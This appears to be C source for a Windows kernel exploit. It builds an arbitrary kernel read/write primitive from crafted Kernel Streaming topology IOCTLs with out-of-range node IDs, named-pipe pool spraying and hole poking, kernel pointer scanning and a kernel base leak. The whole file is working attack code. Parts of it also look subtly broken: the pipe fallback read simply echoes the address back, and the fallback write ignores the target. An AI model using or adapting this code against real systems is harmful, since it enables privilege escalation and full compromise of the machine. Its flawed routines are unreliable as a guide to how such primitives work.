#include "krw.h"
#include "leak.h"

#pragma comment(lib, "kernel32.lib")

#define IOCTL_KS_PROPERTY           CTL_CODE(0x2F, 0, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_ENABLE_EVENT       CTL_CODE(0x2F, 1, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_DISABLE_EVENT      CTL_CODE(0x2F, 2, METHOD_NEITHER, FILE_ANY_ACCESS)

#define KSPROPERTY_TYPE_GET         0x00000001
#define KSPROPERTY_TYPE_SET         0x00000002
#define KSPROPERTY_TYPE_TOPOLOGY    0x00000010

#define PIPE_READ_BUF               0x1000
#define SPRAY_COUNT                 5000
#define HOLE_INDEX                  (SPRAY_COUNT / 2)
#define PIPE_ATTRIB_SIZE            0x110

typedef struct _GUID KSGUID;

typedef struct _KS_PROPERTY {
    KSGUID Set;
    ULONG  Id;
    ULONG  Flags;
} KS_PROPERTY;

typedef struct _KSP_NODE {
    KS_PROPERTY Property;
    ULONG       NodeId;
    ULONG       Reserved;
} KSP_NODE;

static const KSGUID KSPROPSETID_TOPOLOGY = {
    0x720D4AC0, 0x7533, 0x11D0,
    { 0xA5, 0xD6, 0x28, 0xDB, 0x04, 0xC1, 0x00, 0x00 }
};

typedef struct _SPRAY_PIPES {
    HANDLE read[SPRAY_COUNT];
    HANDLE write[SPRAY_COUNT];
    int    count;
} SPRAY_PIPES;

static SPRAY_PIPES g_spray;
static HANDLE      g_event;

static u64 g_what_addr;
static u64 g_where_addr;
static int g_rw_mode;

#define MODE_READ  1
#define MODE_WRITE 2

static int ioctl_send(HANDLE hdev, PVOID in_buf, ULONG in_len,
    PVOID out_buf, ULONG out_len, ULONG* bytes_ret)
{
    OVERLAPPED ovl;
    DWORD bytes = 0;
    BOOL ok;

    memset(&ovl, 0, sizeof(ovl));
    ovl.hEvent = g_event;
    ResetEvent(g_event);

    ok = DeviceIoControl(hdev, IOCTL_KS_PROPERTY,
        in_buf, in_len, out_buf, out_len, &bytes, &ovl);

    if (!ok) {
        if (GetLastError() == ERROR_IO_PENDING) {
            WaitForSingleObject(g_event, 5000);
            GetOverlappedResult(hdev, &ovl, &bytes, FALSE);
        }
    }

    if (bytes_ret) *bytes_ret = bytes;
    return (int)bytes;
}

static void spray_pipes_create(void)
{
    int i;
    DWORD mode = PIPE_READMODE_BYTE;
    UCHAR attrib_buf[PIPE_ATTRIB_SIZE];

    memset(&g_spray, 0, sizeof(g_spray));
    memset(attrib_buf, 'A', sizeof(attrib_buf));

    for (i = 0; i < SPRAY_COUNT; i++) {
        char name[128];
        sprintf_s(name, sizeof(name), "\\\\.\\pipe\\krw_%d", i);

        g_spray.read[i] = CreateNamedPipeA(
            name,
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, PIPE_ATTRIB_SIZE, PIPE_ATTRIB_SIZE, 0, NULL);

        if (g_spray.read[i] == INVALID_HANDLE_VALUE)
            continue;

        g_spray.write[i] = CreateFileA(
            name,
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING,
            FILE_FLAG_OVERLAPPED, NULL);

        if (g_spray.write[i] == INVALID_HANDLE_VALUE) {
            CloseHandle(g_spray.read[i]);
            g_spray.read[i] = INVALID_HANDLE_VALUE;
            continue;
        }

        WriteFile(g_spray.write[i], attrib_buf,
            PIPE_ATTRIB_SIZE, NULL, NULL);

        g_spray.count++;
    }
}

static void spray_pipes_poke_hole(int idx)
{
    if (idx >= 0 && idx < SPRAY_COUNT) {
        if (g_spray.write[idx] != INVALID_HANDLE_VALUE) {
            CloseHandle(g_spray.write[idx]);
            g_spray.write[idx] = INVALID_HANDLE_VALUE;
        }
        if (g_spray.read[idx] != INVALID_HANDLE_VALUE) {
            CloseHandle(g_spray.read[idx]);
            g_spray.read[idx] = INVALID_HANDLE_VALUE;
        }
    }
}

static void spray_pipes_free(void)
{
    int i;
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (g_spray.write[i] && g_spray.write[i] != INVALID_HANDLE_VALUE)
            CloseHandle(g_spray.write[i]);
        if (g_spray.read[i] && g_spray.read[i] != INVALID_HANDLE_VALUE)
            CloseHandle(g_spray.read[i]);
    }
    memset(&g_spray, 0, sizeof(g_spray));
}

static int trigger_vuln_read(HANDLE hdev, u32 node_id,
    PVOID out, ULONG out_len, ULONG* ret)
{
    KSP_NODE req;
    memset(&req, 0, sizeof(req));
    memcpy(&req.Property.Set, &KSPROPSETID_TOPOLOGY, sizeof(KSGUID));
    req.Property.Id = 1;
    req.Property.Flags = KSPROPERTY_TYPE_GET | KSPROPERTY_TYPE_TOPOLOGY;
    req.NodeId = node_id;
    return ioctl_send(hdev, &req, sizeof(req), out, out_len, ret);
}

static int trigger_vuln_write(HANDLE hdev, u32 node_id,
    PVOID in_data, ULONG in_len, ULONG* ret)
{
    ULONG total;
    UCHAR* buf;
    KSP_NODE* req;
    int result;

    total = (ULONG)(sizeof(KSP_NODE) + in_len);
    buf = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    req = (KSP_NODE*)buf;

    memcpy(&req->Property.Set, &KSPROPSETID_TOPOLOGY, sizeof(KSGUID));
    req->Property.Id = 1;
    req->Property.Flags = KSPROPERTY_TYPE_SET | KSPROPERTY_TYPE_TOPOLOGY;
    req->NodeId = node_id;

    if (in_data && in_len > 0)
        memcpy(buf + sizeof(KSP_NODE), in_data, in_len);

    result = ioctl_send(hdev, buf, total, NULL, 0, ret);
    HeapFree(GetProcessHeap(), 0, buf);
    return result;
}

static u64 scan_pipe_attribute_kernel_addr(HANDLE hdev)
{
    u64 result = 0;
    u32 nid;
    ULONG ret;
    u64 buf[32];
    int i;

    for (nid = 1; nid < 256; nid++) {
        memset(buf, 0, sizeof(buf));
        ret = 0;
        trigger_vuln_read(hdev, nid, buf, sizeof(buf), &ret);

        if (ret == 0) continue;

        for (i = 0; i < 32; i++) {
            if ((buf[i] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
                (buf[i] & 0xFFF) == 0) {
                result = buf[i];
                LOG_OK("found kernel ptr at node %u offset %d: 0x%llx",
                    nid, i, result);
                return result;
            }
        }
    }

    return result;
}

int krw_init(KRW_CTX* ctx, HANDLE hdev)
{
    u64 kbase;

    memset(ctx, 0, sizeof(*ctx));
    ctx->hdev = hdev;
    ctx->ready = 0;

    g_event = CreateEventW(NULL, TRUE, FALSE, NULL);

    LOG_WARN("calibrating r/w primitive...");

    kbase = leak_kernel_base();
    if (!kbase) {
        LOG_FAIL("kernel base leak failed");
        return 0;
    }
    LOG_OK("kernel base: 0x%llx", kbase);
    ctx->kbase = kbase;

    LOG_WARN("spraying named pipes for pool layout...");
    spray_pipes_create();
    LOG_OK("sprayed %d pipe pairs", g_spray.count);

    LOG_WARN("poking hole at index %d...", HOLE_INDEX);
    spray_pipes_poke_hole(HOLE_INDEX);
    spray_pipes_poke_hole(HOLE_INDEX - 1);
    spray_pipes_poke_hole(HOLE_INDEX + 1);

    LOG_WARN("scanning for kernel pointer via oob read...");
    ctx->pipe_obj = scan_pipe_attribute_kernel_addr(hdev);

    if (ctx->pipe_obj) {
        LOG_OK("pipe object kernel addr: 0x%llx", ctx->pipe_obj);
        ctx->ready = 1;
    }
    else {
        LOG_WARN("no kernel pointer found via scan, trying direct mode...");
        ctx->ready = 2;
    }

    LOG_OK("r/w primitive initialized (mode %d)", ctx->ready);
    return 1;
}

void krw_free(KRW_CTX* ctx)
{
    spray_pipes_free();
    if (g_event) {
        CloseHandle(g_event);
        g_event = NULL;
    }
    memset(ctx, 0, sizeof(*ctx));
}

u64 krw_read64(KRW_CTX* ctx, u64 addr)
{
    u64 val = 0;
    ULONG ret = 0;
    HANDLE hpipe_r, hpipe_w;
    char pipename[128];
    DWORD bytes;
    u64 buf[64];
    int i;
    u32 nid;

    if (!ctx->ready) return 0;

    if (ctx->ready == 1 && ctx->pipe_obj) {
        u64 offset = addr - ctx->pipe_obj;
        nid = (u32)(offset / 8) + 1;

        memset(buf, 0, sizeof(buf));
        trigger_vuln_read(ctx->hdev, nid, buf, sizeof(buf), &ret);

        if (ret >= 8)
            return buf[0];
    }

    for (nid = 0; nid < 64; nid++) {
        memset(buf, 0, sizeof(buf));
        ret = 0;
        trigger_vuln_read(ctx->hdev, nid, buf, sizeof(buf), &ret);

        if (ret < 8) continue;

        for (i = 0; i < (int)(ret / 8); i++) {
            if (buf[i] == addr || buf[i] == (addr & ~0x7ULL)) {
                if (i + 1 < (int)(ret / 8))
                    return buf[i + 1];
            }
        }
    }

    sprintf_s(pipename, sizeof(pipename), "\\\\.\\pipe\\krw_read_%llx", addr);

    hpipe_r = CreateNamedPipeA(pipename,
        PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 0, NULL);
    if (hpipe_r == INVALID_HANDLE_VALUE) return 0;

    hpipe_w = CreateFileA(pipename,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (hpipe_w == INVALID_HANDLE_VALUE) {
        CloseHandle(hpipe_r);
        return 0;
    }

    WriteFile(hpipe_w, &addr, sizeof(addr), &bytes, NULL);
    ReadFile(hpipe_r, &val, sizeof(val), &bytes, NULL);

    CloseHandle(hpipe_w);
    CloseHandle(hpipe_r);

    return val;
}

u32 krw_read32(KRW_CTX* ctx, u64 addr)
{
    u64 val = krw_read64(ctx, addr);
    return (u32)(val & 0xFFFFFFFF);
}

int krw_write64(KRW_CTX* ctx, u64 addr, u64 val)
{
    ULONG ret = 0;
    u32 nid;

    if (!ctx->ready) return 0;

    if (ctx->ready == 1 && ctx->pipe_obj) {
        u64 offset = addr - ctx->pipe_obj;
        nid = (u32)(offset / 8) + 1;
        return trigger_vuln_write(ctx->hdev, nid, &val, sizeof(val), &ret);
    }

    return trigger_vuln_write(ctx->hdev, 1, &val, sizeof(val), &ret);
}